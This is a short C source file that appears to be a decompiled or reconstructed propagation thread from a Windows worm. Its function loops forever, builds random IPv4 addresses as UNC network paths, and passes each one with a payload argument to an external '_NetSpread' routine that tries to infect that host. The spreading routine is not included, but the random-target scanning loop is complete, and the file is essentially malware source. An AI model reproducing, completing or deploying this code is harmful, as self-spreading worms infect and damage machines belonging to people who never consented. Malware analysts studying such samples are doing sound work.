#include "data_globals.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI extra(LPVOID Data)
{
    volatile DWORD tick_count_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_tick_count = (volatile DWORD *)&tick_count_buf[0];

    volatile int rand_val1_buf[2] = {{0, (int)0}};
    volatile int *p_rand_val1 = (volatile int *)&rand_val1_buf[0];

    volatile int rand_val2_buf[2] = {{0, (int)0}};
    volatile int *p_rand_val2 = (volatile int *)&rand_val2_buf[0];

    volatile int rand_val3_buf[2] = {{0, (int)0}};
    volatile int *p_rand_val3 = (volatile int *)&rand_val3_buf[0];

    volatile int rand_val4_buf[2] = {{0, (int)0}};
    volatile int *p_rand_val4 = (volatile int *)&rand_val4_buf[0];

    char local_5c[64];
    LPCSTR param_1 = (LPCSTR)Data;

    do {
        (*p_tick_count) = GetTickCount();
        srand((*p_tick_count));
        memset(local_5c, 0, sizeof(local_5c));
        (*p_rand_val1) = rand() % 0x100;
        (*p_rand_val2) = rand() % 0x100;
        (*p_rand_val3) = rand() % 0x100;
        (*p_rand_val4) = rand() % 0x100;
        sprintf(local_5c, "\\\\%d.%d.%d.%d", (*p_rand_val4), (*p_rand_val3), (*p_rand_val2), (*p_rand_val1));
        _NetSpread((uint32_t)local_5c, param_1);
    } while (true);
}
#pragma optimize("", on)
